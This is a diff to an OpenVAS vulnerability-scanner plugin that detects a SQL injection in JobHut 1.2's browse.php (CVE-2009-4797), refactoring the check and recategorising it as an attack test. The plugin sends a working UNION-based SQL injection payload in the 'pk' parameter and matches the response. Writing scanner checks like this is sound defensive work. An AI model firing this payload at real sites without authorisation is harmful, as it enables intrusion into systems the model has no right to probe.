@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: JobHut_34300.nasl 4970 2017-01-09 15:00:59Z teissa $
+# $Id: JobHut_34300.nasl 5776 2017-03-30 06:05:40Z cfi $
 #
 # JobHut 'browse.php' SQL Injection Vulnerability
 #
@@ -34,22 +34,19 @@ tag_summary = "JobHut is prone to an SQL-injection vulnerability because it fail
 
   JobHut 1.2 is vulnerable; other versions may also be affected.";
 
-
-if (description)
+if(description)
 {
  script_id(100102);
- script_version("$Revision: 4970 $");
- script_tag(name:"last_modification", value:"$Date: 2017-01-09 16:00:59 +0100 (Mon, 09 Jan 2017) $");
+ script_version("$Revision: 5776 $");
+ script_tag(name:"last_modification", value:"$Date: 2017-03-30 08:05:40 +0200 (Thu, 30 Mar 2017) $");
  script_tag(name:"creation_date", value:"2009-04-05 13:52:05 +0200 (Sun, 05 Apr 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-4797");
  script_bugtraq_id(34300);
-
  script_name("JobHut 'browse.php' SQL Injection Vulnerability");
-
  script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_GATHER_INFO);
+ script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("find_service.nasl", "http_version.nasl");
@@ -63,25 +60,18 @@ include("http_func.inc");
 include("http_keepalive.inc");
 
 port = get_http_port(default:80);
-
-if(!get_port_state(port))exit(0);
 if(!can_host_php(port:port)) exit(0);
 
-dir = make_list("/jobs",cgi_dirs());
+foreach dir( make_list_unique( "/jobs", cgi_dirs( port:port ) ) ) {
 
-foreach d (dir)
-{ 
- url = string(d, '/browse.php?pk=-1%20union%20select%201234567,2--');
- req = http_get(item:url, port:port);
- buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
- if( buf == NULL )continue;
+  if( dir == "/" ) dir = "";
+  url = string(dir, '/browse.php?pk=-1%20union%20select%201234567,2--');
 
- if ( egrep(pattern:"Results [0-9-]+ of 1234567 job\(s\) found", string: buf) )
-     
- 	{    
-       	  security_message(port:port);
-          exit(0);
-        }
+  if(http_vuln_check(port:port, url:url,pattern:"Results [0-9-]+ of 1234567 job\(s\) found")) {
+    report = report_vuln_url( port:port, url:url );
+    security_message( port:port, data:report );
+    exit( 0 );
+  }
 }
 
-exit(0);
+exit( 99 );
